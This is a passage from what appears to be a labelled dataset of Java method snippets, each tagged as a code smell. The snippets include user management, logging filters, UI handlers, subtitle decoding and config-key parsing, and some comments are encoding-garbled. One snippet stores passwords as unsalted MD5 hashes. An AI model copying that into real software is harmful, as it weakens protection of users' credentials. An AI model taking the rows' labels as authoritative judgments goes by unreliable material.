    }
    dataModelService.fillHeaderAndFooter(context,dataModel);
    return;
  }
  String userId;
  try {
    final JSONObject user=new JSONObject();
    user.put(User.USER_NAME,userName);
    user.put(User.USER_EMAIL,email);
    user.put(User.USER_PASSWORD,DigestUtils.md5Hex(password));
    user.put(UserExt.USER_APP_ROLE,appRole);
    user.put(UserExt.USER_STATUS,UserExt.USER_STATUS_C_VALID);
    final JSONObject admin=Sessions.getUser();
    user.put(UserExt.USER_LANGUAGE,admin.optString(UserExt.USER_LANGUAGE));
    userId=userMgmtService.addUser(user);
    operationMgmtService.addOperation(Operation.newOperation(request,Operation.OPERATION_CODE_C_ADD_USER,userId));
  }
 catch (  final ServiceException e) {
    final AbstractFreeMarkerRenderer renderer=new SkinRenderer(context,""admin/error.ftl"");
    final Map<String,Object> dataModel=renderer.getDataModel();
    dataModel.put(Keys.MSG,e.getMessage());
    dataModelService.fillHeaderAndFooter(context,dataModel);
    return;
  }
  context.sendRedirect(Latkes.getServePath() + ""/admin/user/"" + userId);
}",1,Code Smell
"@Override protected void doFilterInternal(HttpServletRequest servletRequest,HttpServletResponse servletResponse,FilterChain filterChain) throws ServletException, IOException {
  String username=null;
  if (SecurityUtils.getUserInfo() == null) {
    username=servletRequest.getParameter(""username"");
  }
 else {
    username=SecurityUtils.getUserInfo().getUsername();
  }
  long start=System.currentTimeMillis();
  String uriName=ApiSaveConstant.getVal(servletRequest.getRequestURI());
  filterChain.doFilter(servletRequest,servletResponse);
  if (uriName != null && userSetting != null && userSetting.getLogInDatabase() != null && userSetting.getLogInDatabase()) {
    LogDto logDto=new LogDto();
    logDto.setName(uriName);
    if (ObjectUtils.isEmpty(username)) {
      username="""";
    }
    logDto.setUsername(username);
    logDto.setAddress(servletRequest.getRemoteAddr());
    logDto.setResult(HttpStatus.valueOf(servletResponse.getStatus()).toString());
    logDto.setTiming(System.currentTimeMillis() - start);
    logDto.setType(servletRequest.getMethod());
    logDto.setUri(servletRequest.getRequestURI());
    logDto.setCreateTime(DateUtil.getNow());
    logService.add(logDto);
  }
}
",1,Code Smell
"private DNSCacheManager getEnvDns(String name,EnvironmentInfoDTO envConfig,HttpConfig httpConfig){
  if (envConfig == null || envConfig.getConfig() == null || envConfig.getConfig().getHostConfig() == null || BooleanUtils.isFalse(envConfig.getConfig().getHostConfig().getEnable()) || httpConfig == null) {
    return null;
  }
  String domain=httpConfig.getHostname().trim();
  int index=domain.indexOf("":"");
  if (index > -1) {
    domain=domain.substring(0,index);
  }
  List<Host> hosts=new ArrayList<>();
  for (  Host host : envConfig.getConfig().getHostConfig().getHosts()) {
    if (StringUtils.isNotBlank(host.getDomain())) {
      String hostDomain=host.getDomain().trim().replace(HTTP,StringUtils.EMPTY).replace(HTTPS,StringUtils.EMPTY);
      if (StringUtils.equals(hostDomain,domain)) {
        host.setDomain(hostDomain);
        hosts.add(host);
      }
    }
  }
  if (CollectionUtils.isNotEmpty(hosts)) {
    return dnsCacheManager(name + ""DNSCacheManager"",hosts);
  }
  return null;
}",1,Code Smell
"public LinkisOperResultAdapter queryJobStatus(String user,String taskID,String execID) throws LinkisClientRuntimeException {
  if (user == null || taskID == null || execID == null) {
    throw new LinkisClientExecutionException(""EXE0036"",ErrorLevel.ERROR,CommonErrMsg.ExecutionErr,""user or jobID or execID is null"");
  }
  checkInit();
  JobExecuteResult executeResult=new JobExecuteResult();
  executeResult.setTaskID(taskID);
  executeResult.setUser(user);
  executeResult.setExecID(execID);
  JobStatusResult jobStatusResult=null;
  int retryTime=0;
  final int MAX_RETRY_TIME=UJESConstants.DRIVER_REQUEST_MAX_RETRY_TIME;
  while (retryTime++ < MAX_RETRY_TIME) {
    try {
      jobStatusResult=client.status(executeResult);
      logger.debug(""job-status: "" + CliUtils.GSON.toJson(jobStatusResult));
      if (jobStatusResult == null || 0 != jobStatusResult.getStatus()) {
        String reason;
        if (jobStatusResult == null) {
          reason=""jobStatusResult is null"";
        }
 else {
          reason=""server returns non-zero status-code. "";
          reason+=jobStatusResult.getMessage();
        }
        String msg=MessageFormat.format(""Get job status failed. retry time : {0}/{1}. taskID={0}, Reason: {1}"",retryTime,MAX_RETRY_TIME,taskID,reason);
        logger.debug("""",new LinkisClientExecutionException(""EXE0013"",ErrorLevel.ERROR,CommonErrMsg.ExecutionErr,msg));
      }
 else {
        break;
      }
    }
 catch (    Exception e) {
      String msg=MessageFormat.format(""Get job status failed. retry time : {0}/{1}"",retryTime,MAX_RETRY_TIME);
      if (e instanceof LinkisException) {
        msg+="" "" + e.toString();
      }
      logger.warn(msg,e);
      if (retryTime >= MAX_RETRY_TIME) {
        throw new LinkisClientExecutionException(""EXE0013"",ErrorLevel.ERROR,CommonErrMsg.ExecutionErr,msg,e);
      }
    }
    CliUtils.doSleepQuietly(UJESConstants.DRIVER_QUERY_SLEEP_MILLS);
  }
  if (jobStatusResult == null || 0 != jobStatusResult.getStatus()) {
    String reason;
    if (jobStatusResult == null) {
      reason=""jobStatusResult is null"";
    }
 else {
      reason=""server returns non-zero status-code. "";
      reason+=jobStatusResult.getMessage();
    }
    String msg=MessageFormat.format(""Get status failed. Retry exhausted. taskID={0}, Reason: {1}"",taskID,reason);
    throw new LinkisClientExecutionException(""EXE0013"",ErrorLevel.ERROR,CommonErrMsg.ExecutionErr,msg);
  }
  return new UJESResultAdapter(jobStatusResult);
}",1,Code Smell
"protected void setPositionInternal(@NotNull Pos newPosition){
  if (newPosition.x() >= MAX_COORDINATE || newPosition.x() <= -MAX_COORDINATE || newPosition.y() >= MAX_COORDINATE || newPosition.y() <= -MAX_COORDINATE || newPosition.z() >= MAX_COORDINATE || newPosition.z() <= -MAX_COORDINATE) {
    newPosition=newPosition.withCoord(MathUtils.clamp(newPosition.x(),-MAX_COORDINATE,MAX_COORDINATE),MathUtils.clamp(newPosition.y(),-MAX_COORDINATE,MAX_COORDINATE),MathUtils.clamp(newPosition.z(),-MAX_COORDINATE,MAX_COORDINATE));
  }
  this.position=newPosition;
}
",1,Code Smell
"public ErrorCode preAction(String clientID,String fromUser,String topic,Qos1PublishHandler.IMCallback callback,ProtoConstants.RequestSourceType requestSourceType){
  LOG.info(""imHandler fromUser={}, clientId={}, topic={}"",fromUser,clientID,topic);
  if (requestSourceType == ProtoConstants.RequestSourceType.Request_From_User && !isNotLimitTopic(topic) && !mLimitCounter.isGranted(clientID + fromUser + topic)) {
    return ErrorCode.ERROR_CODE_OVER_FREQUENCY;
  }
  return ErrorCode.ERROR_CODE_SUCCESS;
}",1,Code Smell
"protected void appendQuestionMark(StringBuilder sqlBuilder){
  if (SqlConsts.IS_NULL.equals(logic) || SqlConsts.IS_NOT_NULL.equals(logic) || value instanceof QueryColumn|| value instanceof QueryWrapper|| value instanceof RawQueryCondition) {
  }
 else   if (SqlConsts.BETWEEN.equals(logic) || SqlConsts.NOT_BETWEEN.equals(logic)) {
    sqlBuilder.append(SqlConsts.AND_PLACEHOLDER);
  }
 else   if (SqlConsts.IN.equals(logic) || SqlConsts.NOT_IN.equals(logic)) {
    int paramsCount=calculateValueArrayCount();
    sqlBuilder.append(SqlConsts.BRACKET_LEFT);
    for (int i=0; i < paramsCount; i++) {
      sqlBuilder.append(SqlConsts.PLACEHOLDER);
      if (i != paramsCount - 1) {
        sqlBuilder.append(SqlConsts.DELIMITER);
      }
    }
    sqlBuilder.append(SqlConsts.BRACKET_RIGHT);
  }
 else {
    sqlBuilder.append(SqlConsts.PLACEHOLDER);
  }
}",1,Code Smell
"@Override public void flashZip(String zipPath,ParcelFileDescriptor outputStream){
  var processBuilder=new ProcessBuilder(""magisk"",""--install-module"",zipPath);
  var fd=new File(""/proc/self/fd/"" + outputStream.getFd());
  processBuilder.redirectOutput(ProcessBuilder.Redirect.appendTo(fd));
  try {
    var proc=processBuilder.start();
    if (proc.waitFor(10,TimeUnit.SECONDS)) {
      var exit=proc.exitValue();
      if (exit == 0) {
        fdw.write(""- Reboot after 5s\n"".getBytes());
        Thread.sleep(5000);
        reboot();
      }
 else {
        var s=""! Flash failed, exit with "" + exit + ""\n"";
        fdw.write(s.getBytes());
      }
    }
 else {
      proc.destroy();
      fdw.write(""! Timeout, abort\n"".getBytes());
    }
  }
 catch (  IOException|InterruptedException|RemoteException e) {
    Log.e(TAG,""flashZip: "",e);
  }
}",1,Code Smell
"/** 
 * Type coercion based on the inferred type from passed in operand and the  {@link SqlTypeFamily} defined in the checkers,e.g. the  {@link com.qihoo.qsql.org.apache.calcite.sql.type.FamilyOperandTypeChecker}. <p>Caution that we do not cast from NUMERIC to NUMERIC. See <a href=""https://docs.google.com/spreadsheets/d/1GhleX5h5W8-kJKh7NMJ4vtoE78pwfaZRJl88ULX_MgU/edit?usp=sharing"">CalciteImplicitCasts</a> for the details.
 * @param in       inferred operand type.
 * @param expected expected {@link SqlTypeFamily} of registered SqlFunction.
 * @return common type of implicit cast, null if we do not find any.
 */
public RelDataType implicitCast(RelDataType in,SqlTypeFamily expected){
  List<SqlTypeFamily> numericFamilies=ImmutableList.of(SqlTypeFamily.NUMERIC,SqlTypeFamily.DECIMAL,SqlTypeFamily.APPROXIMATE_NUMERIC,SqlTypeFamily.EXACT_NUMERIC,SqlTypeFamily.INTEGER);
  List<SqlTypeFamily> dateTimeFamilies=ImmutableList.of(SqlTypeFamily.DATE,SqlTypeFamily.TIME,SqlTypeFamily.TIMESTAMP);
  if (expected.getTypeNames().contains(in.getSqlTypeName())) {
    return in;
  }
  if (SqlTypeUtil.isNull(in)) {
    return expected.getDefaultConcreteType(factory);
  }
  if (SqlTypeUtil.isNumeric(in) && expected == SqlTypeFamily.DECIMAL) {
    return factory.decimalOf(in);
  }
  if (SqlTypeUtil.isApproximateNumeric(in) && expected == SqlTypeFamily.EXACT_NUMERIC) {
    return factory.decimalOf(in);
  }
  if (SqlTypeUtil.isDate(in) && expected == SqlTypeFamily.TIMESTAMP) {
    return factory.createSqlType(SqlTypeName.TIMESTAMP);
  }
  if (SqlTypeUtil.isTimestamp(in) && expected == SqlTypeFamily.DATE) {
    return factory.createSqlType(SqlTypeName.DATE);
  }
  if (SqlTypeUtil.isCharacter(in) && numericFamilies.contains(expected)) {
    return expected.getDefaultConcreteType(factory);
  }
  if (SqlTypeUtil.isCharacter(in) && dateTimeFamilies.contains(expected)) {
    return expected.getDefaultConcreteType(factory);
  }
  if (SqlTypeUtil.isCharacter(in) && expected == SqlTypeFamily.BINARY) {
    return expected.getDefaultConcreteType(factory);
  }
  if (SqlTypeUtil.isAtomic(in) && (expected == SqlTypeFamily.STRING || expected == SqlTypeFamily.CHARACTER)) {
    return expected.getDefaultConcreteType(factory);
  }
  return null;
}",1,Code Smell
"private static void addRemoveFromPlaylist(Context context,Video video,VideoMenuCallback callback,String playlistId,boolean add){
  if (video == null) {
    return;
  }
  Observable<Void> editObserve;
  MediaItemService itemManager=YouTubeMediaItemService.instance();
  if (add) {
    editObserve=itemManager.addToPlaylistObserve(playlistId,video.videoId);
  }
 else {
    if (callback != null && Helpers.equals(video.playlistId,playlistId)) {
      callback.onItemAction(video,VideoMenuCallback.ACTION_REMOVE_FROM_PLAYLIST);
    }
    editObserve=itemManager.removeFromPlaylistObserve(playlistId,video.videoId);
  }
  RxHelper.execute(editObserve,error -> MessageHelpers.showLongMessage(context,error.getMessage()));
}
",1,Code Smell
"/** 
 * Merges this frame with the frame of a subroutine caller at  {@code predLabel}. Only called on the frame at the first block of a subroutine.
 * @param other {@code non-null;} another frame
 * @param subLabel label of subroutine start block
 * @param predLabel label of calling block
 * @return {@code non-null;} the result of merging the two frames
 */
public Frame mergeWithSubroutineCaller(Frame other,int subLabel,int predLabel){
  LocalsArray resultLocals;
  ExecutionStack resultStack;
  resultLocals=getLocals().mergeWithSubroutineCaller(other.getLocals(),predLabel);
  resultStack=getStack().merge(other.getStack());
  IntList newOtherSubroutines=other.subroutines.mutableCopy();
  newOtherSubroutines.add(subLabel);
  newOtherSubroutines.setImmutable();
  if ((resultLocals == getLocals()) && (resultStack == getStack()) && subroutines.equals(newOtherSubroutines)) {
    return this;
  }
  IntList resultSubroutines;
  if (subroutines.equals(newOtherSubroutines)) {
    resultSubroutines=subroutines;
  }
 else {
    IntList nonResultSubroutines;
    if (subroutines.size() > newOtherSubroutines.size()) {
      resultSubroutines=subroutines;
      nonResultSubroutines=newOtherSubroutines;
    }
 else {
      resultSubroutines=newOtherSubroutines;
      nonResultSubroutines=subroutines;
    }
    int szResult=resultSubroutines.size();
    int szNonResult=nonResultSubroutines.size();
    for (int i=szNonResult - 1; i >= 0; i--) {
      if (nonResultSubroutines.get(i) != resultSubroutines.get(i + (szResult - szNonResult))) {
        throw new RuntimeException(""Incompatible merged subroutines"");
      }
    }
  }
  return new Frame(resultLocals,resultStack,resultSubroutines);
}",1,Code Smell
"/** 
 * 楠岃瘉鐢ㄦ埛鏄惁鍏锋湁浠ヤ笅浠绘剰涓�涓鑹�
 * @param roles 浠� ROLE_NAMES_DELIMETER 涓哄垎闅旂鐨勮鑹插垪琛�
 * @return 鐢ㄦ埛鏄惁鍏锋湁浠ヤ笅浠绘剰涓�涓鑹�
 */
public boolean hasAnyRoles(String roles){
  if (StringUtils.isEmpty(roles)) {
    return false;
  }
  LoginUser loginUser=SecurityUtils.getLoginUser();
  if (StringUtils.isNull(loginUser) || CollectionUtils.isEmpty(loginUser.getUser().getRoles())) {
    return false;
  }
  for (  String role : roles.split(ROLE_DELIMETER)) {
    if (hasRole(role)) {
      return true;
    }
  }
  return false;
}
",1,Code Smell
"@Override public void onClick(View v){
  if (getDragState() == SwipeHelper.STATE_IDLE && !mShowScrimAndShadowOutsideContentView && v == mScrimView) {
    smoothClose();
  }
}
",1,Code Smell
"public static Object dataTarget(EruptModel eruptModel,Object data,Object target,SceneEnum sceneEnum){
  for (  EruptFieldModel fieldModel : eruptModel.getEruptFieldModels()) {
    EruptField eruptField=fieldModel.getEruptField();
    boolean readonly=sceneEnum == SceneEnum.EDIT ? eruptField.edit().readonly().edit() : eruptField.edit().readonly().add();
    if (StringUtils.isNotBlank(eruptField.edit().title()) && !readonly) {
      Field f=fieldModel.getField();
      try {
        f.setAccessible(true);
        if (eruptField.edit().type() == EditType.TAB_TABLE_ADD) {
          Collection<?> s=(Collection<?>)f.get(target);
          if (null == s) {
            f.set(target,f.get(data));
          }
 else {
            s.clear();
            s.addAll((Collection)f.get(data));
            f.set(target,s);
          }
        }
 else {
          if (eruptField.edit().type() == EditType.INPUT && eruptField.edit().inputType().autoTrim() && null != f.get(data)) {
            f.set(target,f.get(data).toString().trim());
          }
 else {
            f.set(target,f.get(data));
          }
        }
      }
 catch (      IllegalAccessException e) {
        log.error(""erupt data copy error"",e);
      }
    }
  }
  return target;
}
",1,Code Smell
"@Override public Insets getBorderInsets(Component c,Insets insets){
  if (c instanceof Container && ((Container)c).getComponentCount() > 0 && ((Container)c).getComponent(0) instanceof JScrollPane) {
    insets.left=insets.top=insets.right=insets.bottom=UIScale.scale(1);
    return insets;
  }
  return super.getBorderInsets(c,insets);
}",1,Code Smell
"final void signalAutoTransitionsAfterRun(){
  if (mOutgoings != null) {
    for (    Transition t : mOutgoings) {
      if (t.mEvent == null) {
        if (t.mCondition == null || t.mCondition.canProceed()) {
          if (DEBUG) {
            Log.d(TAG,""signal "" + t);
          }
          mInvokedOutTransitions++;
          t.mState=STATUS_INVOKED;
          if (!mBranchStart) {
            break;
          }
        }
      }
    }
  }
}
",1,Code Smell
"private RowMapper<Application> createApplicationRowMapper(ObjectMapper mapper){
  return new BeanPropertyRowMapper<Application>(Application.class){
    @SneakyThrows @Override protected Object getColumnValue(    ResultSet rs,    int index,    PropertyDescriptor pd){
      if (pd.getName().equals(""tracePoints"")) {
        String tracePointsJson=rs.getString(""trace_points"");
        if (StringUtils.isEmpty(tracePointsJson)) {
          return null;
        }
        return mapper.readValue(tracePointsJson,new TypeReference<List<TracePoint>>(){
        }
);
      }
 else       if (pd.getName().equals(""customTags"")) {
        String tagsJson=rs.getString(""custom_tags"");
        if (StringUtils.isEmpty(tagsJson)) {
          return null;
        }
        return mapper.readValue(tagsJson,new TypeReference<List<Application.CustomTag>>(){
        }
);
      }
 else       if (pd.getName().equals(""logPoints"")) {
        String logPointsJson=rs.getString(""log_points"");
        if (StringUtils.isEmpty(logPointsJson)) {
          return null;
        }
        return mapper.readValue(logPointsJson,new TypeReference<List<LogPoint>>(){
        }
);
      }
 else {
        return super.getColumnValue(rs,index,pd);
      }
    }
  }
;
}
",1,Code Smell
"/** 
 * Populates the internal map of the JSONObject with the bean properties. The bean can not be recursive.
 * @see JSONObject#JSONObject(Object)
 * @param bean the bean
 */
private void populateMap(Object bean){
  Class<?> klass=bean.getClass();
  boolean includeSuperClass=klass.getClassLoader() != null;
  Method[] methods=includeSuperClass ? klass.getMethods() : klass.getDeclaredMethods();
  for (  final Method method : methods) {
    final int modifiers=method.getModifiers();
    if (Modifier.isPublic(modifiers) && !Modifier.isStatic(modifiers) && method.getParameterTypes().length == 0 && !method.isBridge() && method.getReturnType() != Void.TYPE && isValidMethodName(method.getName())) {
      final String key=getKeyNameFromMethod(method);
      if (key != null && !key.isEmpty()) {
        try {
          final Object result=method.invoke(bean);
          if (result != null) {
            this.map.put(key,wrap(result));
            if (result instanceof Closeable) {
              try {
                ((Closeable)result).close();
              }
 catch (              IOException ignore) {
              }
            }
          }
        }
 catch (        IllegalAccessException ignore) {
        }
catch (        IllegalArgumentException ignore) {
        }
catch (        InvocationTargetException ignore) {
        }
      }
    }
  }
}",1,Code Smell
"/** 
 * Appends items using cached locations,  returning true if at least one item is appended and (oneColumnMode is true or reach limit and aboveIndex). This method should only be called by appendVisibleItems()
 */
protected final boolean appendVisbleItemsWithCache(int toLimit,boolean oneColumnMode){
  if (mLocations.size() == 0) {
    return false;
  }
  final int count=mProvider.getCount();
  int itemIndex;
  int edge;
  if (mLastVisibleIndex >= 0) {
    itemIndex=mLastVisibleIndex + 1;
    edge=mProvider.getEdge(mLastVisibleIndex);
  }
 else {
    edge=Integer.MAX_VALUE;
    itemIndex=mStartIndex != START_DEFAULT ? mStartIndex : 0;
    if (itemIndex > getLastIndex() + 1 || itemIndex < getFirstIndex()) {
      mLocations.clear();
      return false;
    }
 else     if (itemIndex > getLastIndex()) {
      return false;
    }
  }
  int lastIndex=getLastIndex();
  for (; itemIndex < count && itemIndex <= lastIndex; itemIndex++) {
    Location loc=getLocation(itemIndex);
    if (edge != Integer.MAX_VALUE) {
      edge=edge + loc.offset;
    }
    int rowIndex=loc.row;
    int size=mProvider.createItem(itemIndex,true,mTmpItem,false);
    if (size != loc.size) {
      loc.size=size;
      mLocations.removeFromEnd(lastIndex - itemIndex);
      lastIndex=itemIndex;
    }
    mLastVisibleIndex=itemIndex;
    if (mFirstVisibleIndex < 0) {
      mFirstVisibleIndex=itemIndex;
    }
    mProvider.addItem(mTmpItem[0],itemIndex,size,rowIndex,edge);
    if (!oneColumnMode && checkAppendOverLimit(toLimit)) {
      return true;
    }
    if (edge == Integer.MAX_VALUE) {
      edge=mProvider.getEdge(itemIndex);
    }
    if (rowIndex == mNumRows - 1) {
      if (oneColumnMode) {
        return true;
      }
    }
  }
  return false;
}",1,Code Smell
"private void updateCell(){
  if (sendLocationCell != null) {
    if (locationType == LocationActivity.LOCATION_TYPE_GROUP || customLocation != null) {
      String address="""";
      if (!TextUtils.isEmpty(addressName)) {
        address=addressName;
      }
 else       if (customLocation == null && gpsLocation == null || fetchingLocation) {
        address=LocaleController.getString(""Loading"",R.string.Loading);
      }
 else       if (customLocation != null) {
        address=String.format(Locale.US,""(%f,%f)"",customLocation.getLatitude(),customLocation.getLongitude());
      }
 else       if (gpsLocation != null) {
        address=String.format(Locale.US,""(%f,%f)"",gpsLocation.getLatitude(),gpsLocation.getLongitude());
      }
 else       if (!myLocationDenied) {
        address=LocaleController.getString(""Loading"",R.string.Loading);
      }
      if (locationType == LocationActivity.LOCATION_TYPE_GROUP) {
        sendLocationCell.setText(LocaleController.getString(""ChatSetThisLocation"",R.string.ChatSetThisLocation),address);
      }
 else {
        sendLocationCell.setText(LocaleController.getString(""SendSelectedLocation"",R.string.SendSelectedLocation),address);
      }
      sendLocationCell.setHasLocation(true);
    }
 else {
      if (gpsLocation != null) {
        sendLocationCell.setText(LocaleController.getString(""SendLocation"",R.string.SendLocation),LocaleController.formatString(""AccurateTo"",R.string.AccurateTo,LocaleController.formatPluralString(""Meters"",(int)gpsLocation.getAccuracy())));
        sendLocationCell.setHasLocation(true);
      }
 else {
        sendLocationCell.setText(LocaleController.getString(""SendLocation"",R.string.SendLocation),myLocationDenied ? """" : LocaleController.getString(""Loading"",R.string.Loading));
        sendLocationCell.setHasLocation(!myLocationDenied);
      }
    }
  }
}
",1,Code Smell
"@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (LicenseStatus.sDisableCommonHooks) {
    return;
  }
  if (!isEnabled()) {
    return;
  }
  if (MSG_INFO_OFFSET < 0) {
    Class<?>[] argt=((Method)param.method).getParameterTypes();
    int hit=0;
    for (int i=0; i < argt.length; i++) {
      if (argt[i].equals(String.class)) {
        if (hit == 1) {
          MSG_INFO_OFFSET=i;
          break;
        }
 else {
          hit++;
        }
      }
    }
  }
  String desc=(String)param.args[MSG_INFO_OFFSET];
  if (desc != null && (desc.endsWith(""赞了你的说说"") || desc.endsWith(""赞了你的分享"") || desc.endsWith(""赞了你的照片""))) {
    param.setResult(null);
  }
}",1,Code Smell
"/** 
 * Paint a 2-bit/pixel code string, as defined by ETSI EN 300 743 7.2.5.2, to a canvas.
 */
private static int paint2BitPixelCodeString(ParsableBitArray data,int[] clutEntries,byte[] clutMapTable,int column,int line,Paint paint,Canvas canvas){
  boolean endOfPixelCodeString=false;
  do {
    int runLength=0;
    int clutIndex=0;
    int peek=data.readBits(2);
    if (peek != 0x00) {
      runLength=1;
      clutIndex=peek;
    }
 else     if (data.readBit()) {
      runLength=3 + data.readBits(3);
      clutIndex=data.readBits(2);
    }
 else     if (data.readBit()) {
      runLength=1;
    }
 else {
switch (data.readBits(2)) {
case 0x00:
        endOfPixelCodeString=true;
      break;
case 0x01:
    runLength=2;
  break;
case 0x02:
runLength=12 + data.readBits(4);
clutIndex=data.readBits(2);
break;
case 0x03:
runLength=29 + data.readBits(8);
clutIndex=data.readBits(2);
break;
}
}
if (runLength != 0 && paint != null) {
paint.setColor(clutEntries[clutMapTable != null ? clutMapTable[clutIndex] : clutIndex]);
canvas.drawRect(column,line,column + runLength,line + 1,paint);
}
column+=runLength;
}
 while (!endOfPixelCodeString);
return column;
}",1,Code Smell
"@Override public boolean dispatchKeyEvent(KeyEvent event){
  boolean isHomeFragment=mBinding.pager.getCurrentItem() == 0;
  if (isHomeFragment && KeyUtil.isMenuKey(event)) {
    if (Setting.getHomeMenuKey() == 0)     MenuDialog.create(this).show();
 else     if (Setting.getHomeMenuKey() == 1)     SiteDialog.create(this).show();
 else     if (Setting.getHomeMenuKey() == 2)     HistoryDialog.create(this).type(0).show();
 else     if (Setting.getHomeMenuKey() == 3)     LiveActivity.start(this);
 else     if (Setting.getHomeMenuKey() == 4)     HistoryActivity.start(this);
 else     if (Setting.getHomeMenuKey() == 5)     SearchActivity.start(this);
 else     if (Setting.getHomeMenuKey() == 6)     PushActivity.start(this);
 else     if (Setting.getHomeMenuKey() == 7)     KeepActivity.start(this);
 else     if (Setting.getHomeMenuKey() == 8)     SettingActivity.start(this);
  }
  if (!isHomeFragment && KeyUtil.isMenuKey(event))   updateFilter((Class)mAdapter.get(mBinding.pager.getCurrentItem()));
  if (!isHomeFragment && KeyUtil.isBackKey(event) && event.isLongPress()&& getFragment().goRoot())   setCoolDown();
  return super.dispatchKeyEvent(event);
}",1,Code Smell
"public static String getFileName(FileMessageBean fileMessageBean){
  if (fileMessageBean != null && fileMessageBean.getV2TIMMessage() != null && fileMessageBean.getV2TIMMessage().getFileElem() != null) {
    return fileMessageBean.getV2TIMMessage().getFileElem().getFileName();
  }
  return null;
}",1,Code Smell
"private void sendTextMessage(){
  if (mSendEnable) {
    if (mMessageHandler != null) {
      if (mChatLayout == null) {
        mMessageHandler.sendMessage(ChatMessageBuilder.buildTextMessage(mTextInput.getText().toString()));
      }
 else {
        if ((isQuoteModel || isReplyModel) && replyPreviewBean != null) {
          if (TUIChatUtils.isGroupChat(mChatLayout.getChatInfo().getType()) && !mTextInput.getMentionIdList().isEmpty()) {
            List<String> atUserList=new ArrayList<>(mTextInput.getMentionIdList());
            mMessageHandler.sendMessage(ChatMessageBuilder.buildAtReplyMessage(mTextInput.getText().toString(),atUserList,replyPreviewBean));
          }
 else {
            mMessageHandler.sendMessage(ChatMessageBuilder.buildReplyMessage(mTextInput.getText().toString(),replyPreviewBean));
          }
          exitReply();
        }
 else {
          if (TUIChatUtils.isGroupChat(mChatLayout.getChatInfo().getType()) && !mTextInput.getMentionIdList().isEmpty()) {
            List<String> atUserList=new ArrayList<>(mTextInput.getMentionIdList());
            if (atUserList.isEmpty()) {
              mMessageHandler.sendMessage(ChatMessageBuilder.buildTextMessage(mTextInput.getText().toString()));
            }
 else {
              mMessageHandler.sendMessage(ChatMessageBuilder.buildTextAtMessage(atUserList,mTextInput.getText().toString()));
            }
          }
 else {
            mMessageHandler.sendMessage(ChatMessageBuilder.buildTextMessage(mTextInput.getText().toString()));
          }
        }
      }
    }
    mIsSending=true;
    mTextInput.setText("""");
  }
}
",1,Code Smell
"private void updateStoriesPosting(){
  final boolean storiesEnabled=getMessagesController().storiesEnabled();
  if (this.storiesEnabled != storiesEnabled) {
    if (floatingButton2Container != null) {
      floatingButton2Container.setVisibility(onlySelect && initialDialogsType != 10 || folderId != 0 || !storiesEnabled || (searchItem != null && searchItem.isSearchFieldVisible()) || isInPreviewMode() ? View.GONE : View.VISIBLE);
    }
    updateFloatingButtonOffset();
    if (!this.storiesEnabled && storiesEnabled && storyHint != null) {
      storyHint.show();
    }
    this.storiesEnabled=storiesEnabled;
  }
  if (floatingButton == null || floatingButtonContainer == null) {
    return;
  }
  if (initialDialogsType == DIALOGS_TYPE_WIDGET) {
    floatingButton.setImageResource(R.drawable.floating_check);
    floatingButtonContainer.setContentDescription(LocaleController.getString(""Done"",R.string.Done));
  }
 else   if (storiesEnabled) {
    floatingButton.setAnimation(R.raw.write_contacts_fab_icon_camera,56,56);
    floatingButtonContainer.setContentDescription(LocaleController.getString(""AccDescrCaptureStory"",R.string.AccDescrCaptureStory));
  }
 else {
    floatingButton.setAnimation(R.raw.write_contacts_fab_icon,52,52);
    floatingButtonContainer.setContentDescription(LocaleController.getString(""NewMessageTitle"",R.string.NewMessageTitle));
  }
}",1,Code Smell
"/** 
 * 鏄惁鏄彲浠ュ瀭鐩存粴鍔╒iew銆�(鍐呭鍙互婊氬姩锛屾垨鑰呮湰韬氨鏄釜婊氬姩甯冨眬)
 * @param view
 * @return
 */
static boolean canScrollVertically(View view){
  return isConsecutiveScrollerChild(view) && (canScrollVertically(view,1) || canScrollVertically(view,-1));
}
/** 
 * 鍒ゆ柇鏄惁鍙互婊戝姩
 * @param view
 * @param direction
 * @return
 */
static boolean canScrollVertically(View view,int direction){
  View scrolledView=getScrolledView(view);
  if (scrolledView.getVisibility() == View.GONE) {
    return false;
  }
  if (scrolledView instanceof AbsListView) {
    AbsListView listView=(AbsListView)scrolledView;
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
      return listView.canScrollList(direction);
    }
 else {
      return false;
    }
  }
 else {
    if (scrolledView instanceof RecyclerView) {
      RecyclerView recyclerView=(RecyclerView)scrolledView;
      if (recyclerView.canScrollHorizontally(1) || recyclerView.canScrollHorizontally(-1)) {
        if (!recyclerView.canScrollVertically(direction)) {
          return false;
        }
      }
      RecyclerView.LayoutManager layoutManager=recyclerView.getLayoutManager();
      RecyclerView.Adapter adapter=recyclerView.getAdapter();
      if (layoutManager != null && adapter != null && adapter.getItemCount() > 0) {
        boolean isReverseLayout=false;
        if (layoutManager instanceof LinearLayoutManager) {
          isReverseLayout=((LinearLayoutManager)layoutManager).getReverseLayout();
        }
 else         if (layoutManager instanceof StaggeredGridLayoutManager) {
          isReverseLayout=((StaggeredGridLayoutManager)layoutManager).getReverseLayout();
        }
        int targetPosition=0;
        if (isReverseLayout) {
          targetPosition=direction < 0 ? adapter.getItemCount() - 1 : 0;
        }
 else {
          targetPosition=direction > 0 ? adapter.getItemCount() - 1 : 0;
        }
        View itemView=layoutManager.findViewByPosition(targetPosition);
        if (itemView == null) {
          return true;
        }
      }
 else {
        return false;
      }
      int count=recyclerView.getChildCount();
      if (direction > 0) {
        for (int i=count - 1; i >= 0; i--) {
          View child=recyclerView.getChildAt(i);
          recyclerView.getDecoratedBoundsWithMargins(child,mBounds);
          if (mBounds.bottom > recyclerView.getHeight() - recyclerView.getPaddingBottom()) {
            return true;
          }
        }
        return false;
      }
 else {
        for (int i=0; i < count; i++) {
          View child=recyclerView.getChildAt(i);
          recyclerView.getDecoratedBoundsWithMargins(child,mBounds);
          if (mBounds.top < recyclerView.getPaddingTop()) {
            return true;
          }
        }
        return false;
      }
    }
    return scrolledView.canScrollVertically(direction);
  }
}",1,Code Smell
"private void checkPreload(int position){
  if (onPreload != null && position == Math.max(getItemCount() - 1 - preloadItemCount,0) && scrollState != RecyclerView.SCROLL_STATE_IDLE) {
    onPreload.run();
  }
}",1,Code Smell
"static public String[] parseKey(String groupKey){
  StringBuilder sb=new StringBuilder();
  String dataId=null;
  String group=null;
  String tenant=null;
  for (int i=0; i < groupKey.length(); ++i) {
    char c=groupKey.charAt(i);
    if ('+' == c) {
      if (null == dataId) {
        dataId=sb.toString();
        sb.setLength(0);
      }
 else       if (null == group) {
        group=sb.toString();
        sb.setLength(0);
      }
 else {
